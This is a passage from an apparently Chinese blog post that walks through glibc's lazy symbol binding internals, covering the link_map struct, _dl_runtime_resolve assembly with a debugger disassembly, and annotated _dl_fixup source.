class="comment">/* 第一次导致该对象被加载的对象。  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line">    <span class="comment">/* 版本名称的数组。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line">    <span class="comment">/* 符号Hash表 */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* dlopen/dlclose的引用计数。  */</span></span><br><span class="line">    <span class="keyword">enum</span> &#123;                    <span class="comment">/* 该对象来自何处。 */</span></span><br><span class="line">        lt_executable,        <span class="comment">/* 主要的可执行程序。 */</span></span><br><span class="line">        lt_library,           <span class="comment">/* 主可执行文件需要的库。 */</span></span><br><span class="line">        lt_loaded             <span class="comment">/* 额外的运行时加载的共享库。 */</span></span><br><span class="line">    &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;      <span class="comment">/* 如果对象的重定位完成，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>;    <span class="comment">/* 如果DT_INIT函数被调用，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;         <span class="comment">/* 如果对象在_dl_global_scope中，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;       <span class="comment">/* 保留供内部使用。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* 如果分配了由“ l_phdr”指向的数据结构，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>;   <span class="comment">/* 如果确定SO_NAME在l_libname列表中，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;          <span class="comment">/* 如果这是一个没有关联文件的伪造描述符，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>;  <span class="comment">/* 重定位完成后，如果在此link map上调用GL（dl_init_static_tls），则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;       <span class="comment">/* 如果DSO用于审计，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>;  <span class="comment">/* 如果至少一个审计模块对PLT拦截感兴趣，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;        <span class="comment">/* 如果该对象已被删除而无法再使用，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>;     <span class="comment">/* 如果段间孔受到保护，或者根本不存在孔，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* 如果LD_TRACE_PRELINKING = 1期间的</span></span><br><span class="line"><span class="comment">                                                l_local_scope包含任何DT_SYMBOLIC库，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* 如果可以释放l_initfini，则为非零值。即，没有在ld.so中与虚拟malloc一起分配。 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 收集有关自己的RPATH目录的信息。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line">    <span class="comment">/* 概要分析时收集的重定位结果。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span> &#123;</span></span><br><span class="line">        DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">        <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">        <span class="comment">/* 并发性注：这用于保护跨多个线程的重定位结果的并发初始化。 请参阅elf/dl-runtime.c中的更详细说明。 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> init;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line">    <span class="comment">/* 指向版本信息的指针（如果有）。 */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line">    <span class="comment">/* 字符串，指定找到此对象的路径。 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line">    <span class="comment">/* 此对象的内存映射的开始和结束。 l_map_start不必与l_addr相同。 */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* 映射的可执行部分的结尾。 */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line">    <span class="comment">/* “l_scope”的默认数组。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* 为“ l_scope”分配的数组大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* 这是一个定义此link map的查找范围的数组。最初最多有三个不同的范围列表。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line">    <span class="comment">/* 类似的数组，这次仅与本地范围有关。偶尔使用。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line">    <span class="comment">/* 保留此信息以检查共享对象是否与已加载的对象相同。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line">    <span class="comment">/* 收集有关自己的RUNPATH目录的信息。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line">    <span class="comment">/* 按init和fini调用的顺序列出对象。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line">    <span class="comment">/* 通过符号绑定引入的依赖项列表。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span> &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">    &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line">    <span class="comment">/* 如果使用DSO，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line">    <span class="comment">/* 各种标志字。 */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line">    <span class="comment">/* 暂时在dl_close中使用。 */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">        <span class="keyword">int</span> type_class;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line">    <span class="comment">/* 线程本地存储相关信息。 */</span></span><br><span class="line">    <span class="comment">/* 初始化映像的开始。 */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* 初始化映像的大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* TLS块的大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* TLS块的对齐要求。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* 第一个字节模块对齐方式的偏移量。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET        0</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">"FORCED_DYNAMIC_TLS_OFFSET is not defined"</span></span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 对于启动时出现的对象：静态TLS块中的偏移量。 */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* dtv数组中模块的索引。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line">    <span class="comment">/* 此DSO构造的thread_local对象的数量。 这是原子访问和修改的，</span></span><br><span class="line"><span class="comment">    并不总是受加载锁保护。 另请参见：cxa_thread_atexit_impl.c中的“注意事项”。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line">    <span class="comment">/* 重定位完成后用于更改权限的信息。 */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line">    <span class="comment">/* 审计信息。 该数组显然必须是结构体中的最后一个。 切勿在其后添加任何内容。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> &#123;</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> cookie;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> bindflags;</span><br><span class="line">    &#125; l_audit[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="3-2-1、-dl-runtime-resolve-的内容"><a href="#3-2-1、-dl-runtime-resolve-的内容" class="headerlink" title="3.2.1、_dl_runtime_resolve()的内容"></a>3.2.1、_dl_runtime_resolve()的内容</h4><p>&emsp;&emsp;<strong><code>_dl_runtime_resolve()</code></strong>在<code>glibc-2.23/sysdeps/i386/dl-trampoline.S(64位把i386改为x86_64)</code>中使用<code>汇编</code>实现，其主要代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">	.text</span></span><br><span class="line"><span class="meta">	.globl</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">	.type</span> _dl_runtime_resolve, @function</span><br><span class="line">    cfi_startproc</span><br><span class="line"><span class="meta">	.align</span> <span class="number">16</span></span><br><span class="line"><span class="symbol">_dl_runtime_resolve:</span></span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">    _CET_ENDBR</span><br><span class="line">    pushl %eax  # Preserve registers otherwise clobbered.</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    pushl %ecx</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    pushl %edx</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    movl <span class="number">16</span>(%esp), %edx  # Copy args pushed by PLT <span class="keyword">in</span> register.  Note</span><br><span class="line">    movl <span class="number">12</span>(%esp), %eax  # that <span class="string">'fixup'</span> takes its parameters <span class="keyword">in</span> regs.</span><br><span class="line">    <span class="keyword">call</span> _dl_fixup       # <span class="keyword">Call</span> resolver.</span><br><span class="line">    popl %edx            # Get register content back.</span><br><span class="line">    cfi_adjust_cfa_offset (-<span class="number">4</span>)</span><br><span class="line">    movl (%esp), %ecx</span><br><span class="line">    movl %eax, (%esp)    # Store the function address.</span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">    <span class="keyword">ret</span> <span class="number">$12</span>              # Jump to function address.</span><br><span class="line">    cfi_endproc</span><br><span class="line"><span class="meta">	.size</span> _dl_runtime_resolve, .-_dl_runtime_resolve</span><br></pre></td></tr></table></figure></p>
<p><code>修正后</code>的代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       <span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line"><span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     <span class="keyword">push</span>   <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     <span class="keyword">push</span>   <span class="built_in">edx</span></span><br><span class="line"><span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0x10</span>]</span><br><span class="line"><span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0xc</span>]</span><br><span class="line">► <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;  <span class="keyword">call</span>   _dl_fixup &lt;<span class="number">0xf7fe77e0</span>&gt;</span><br><span class="line">     arg[<span class="number">0</span>]: <span class="number">0xc</span></span><br><span class="line">     arg[<span class="number">1</span>]: <span class="number">0x8048670</span> ◂— <span class="keyword">imul</span>   <span class="built_in">ebp</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span> + <span class="number">0x70</span>], <span class="number">0x6e207475</span> /* <span class="string">'input name:'</span> */</span><br><span class="line"></span><br><span class="line"><span class="number">0xf7fee010</span> &lt;_dl_runtime_resolve+<span class="number">16</span>&gt;    <span class="keyword">pop</span>    <span class="built_in">edx</span></span><br><span class="line"><span class="number">0xf7fee011</span> &lt;_dl_runtime_resolve+<span class="number">17</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>]</span><br><span class="line"><span class="number">0xf7fee014</span> &lt;_dl_runtime_resolve+<span class="number">20</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="number">0xf7fee017</span> &lt;_dl_runtime_resolve+<span class="number">23</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">4</span>]</span><br><span class="line"><span class="number">0xf7fee01b</span> &lt;_dl_runtime_resolve+<span class="number">27</span>&gt;    <span class="keyword">ret</span>    <span class="number">0xc</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;其采用了<code>GNU风格</code>的语法，<code>可读性</code>比较差。我们可以看到函数<code>_dl_runtime_resolve()</code>调用了<strong><code>_dl_fixup(link_map，reloc_arg)</code></strong>，后续操作都是在这个函数中完成的。</p>
<h4 id="3-2-2、-dl-fixup-的内容"><a href="#3-2-2、-dl-fixup-的内容" class="headerlink" title="3.2.2、_dl_fixup()的内容"></a>3.2.2、_dl_fixup()的内容</h4><p><code>_dl_fixup()</code>的实现位于<strong><code>glibc/elf/dl-runtime.c</code></strong>，其内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* elf_machine_type_class()返回的重定位类型类。 </span></span><br><span class="line"><span class="comment">   ELF_RTYPE_CLASS_PLT表示此重定位不应由某些PLT符号满足，</span></span><br><span class="line"><span class="comment">   ELF_RTYPE_CLASS_COPY意味着此重定位不应由可执行文件中的任何符号满足。 </span></span><br><span class="line"><span class="comment">   某些体系结构不支持copy重定位(引用外部变量)。 在这种情况下，我们将宏定义为零，以便自</span></span><br><span class="line"><span class="comment">   动优化处理它们的代码。 ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA表示</span></span><br><span class="line"><span class="comment">   共享库中定义的受保护数据的地址可能是外部的，即由于copy重定位。 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_RTYPE_CLASS_PLT 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DL_NO_COPY_RELOCS</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> ELF_RTYPE_CLASS_COPY 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> ELF_RTYPE_CLASS_COPY 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第一次调用每个PLT条目时，将通过PLT的特殊跳转调用此功能。 我们必须执行给定共享对象的PLT中指定的重定位，并将已解析的函数地址返回到跳转，这将重新启动对该地址的原始调用。 将来的调用将直接从PLT跳转到该功能。 */</span></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           <span class="comment">//l为共享库或可执行文件ID，link_map结构指针。link_map结构链表第一个结点表示的是可执行文件。</span></span><br><span class="line">           <span class="comment">//reloc_arg为所解析函数的重定位项在重定位表.rel.plt中的偏移</span></span><br><span class="line">           struct link_map *l, ElfW(Word) reloc_arg)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//D_PTR是一个宏定义，位于glibc/sysdeps/generic/ldsodefs.h中，用于通过link_map结构体寻址。</span></span><br><span class="line">    <span class="comment">//通过link_map结构获取动态链接符号表.dynsym的地址</span></span><br><span class="line">    <span class="comment">//ELFW宏用来拼接字符串，在这里实际上是为了自动兼容32和64位,Elf32_Sym或Elf64_Sym</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//通过link_map结构获取动态链接字符串表.dynstr的地址</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]); </span><br><span class="line">    <span class="comment">//通过link_map结构获取重定位表.rel.plt中所求函数的重定位项的地址</span></span><br><span class="line">    <span class="comment">//reloc_offset为所解析函数的重定位项在重定位表.rel.plt中的偏移</span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); </span><br><span class="line">    <span class="comment">//求出所求函数在动态链接符号表.dynsym中对应符号项的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">    <span class="comment">//l_addr是共享库或可执行文件加载基址，rel_addr是重定位需要修改内容的地址，也就是.got.plt中所求函数对应项</span></span><br><span class="line">    <span class="comment">//r_offset为相对虚拟地址，rel_addr为虚拟地址</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">lookup_t</span> result;    <span class="comment">//查找函数的结果，其为定义函数的共享对象的加载基地址</span></span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  <span class="comment">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 安全性检查，我们需要确定它是一个PLT的重定位项 */</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">/* 查找目标符号。如果未使用常规查找规则，则不要在全局范围内查找。 */</span></span><br><span class="line">    <span class="comment">//st_other定义了符号的可见性，__builtin_expect返回值为第一个参数</span></span><br><span class="line">    <span class="comment">//#define ELF32_ST_VISIBILITY(o) ((o) &amp; 0x03)</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) <span class="comment">//使用了常规查找规则</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>   <span class="comment">//当前符号的版本</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)   </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//获取动态符号版本表“.gnu.version”的地址</span></span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  <span class="comment">//得到当前所解析符号的版本</span></span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 我们需要保持范围不变，因此需要进行一些锁定。 对于无法卸载的对象或尚未使用任何线程的对象，这不是必需的。  */</span></span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">        &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">            RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">//strtab + 